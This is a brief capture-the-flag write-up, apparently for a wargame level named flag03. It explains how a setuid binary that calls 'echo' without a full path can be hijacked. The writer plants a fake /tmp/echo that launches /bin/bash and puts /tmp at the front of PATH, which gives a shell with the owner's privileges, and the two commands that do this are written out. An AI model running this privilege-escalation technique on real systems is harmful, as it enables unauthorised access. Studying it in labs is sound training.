the binary uses the echo function (you can see it if you decompile it, or simply cat the binary and look carefully), 
then creating an echo dummy command that is in fact a shell and changing 
env path to search in a specific folder where your echo dummy is located
 you can open a shell as if you where the program owner, that means flag03


echo "/bin/bash" > /tmp/echo
chmod 777 /tmp/echo && export PATH=/tmp:$PATH
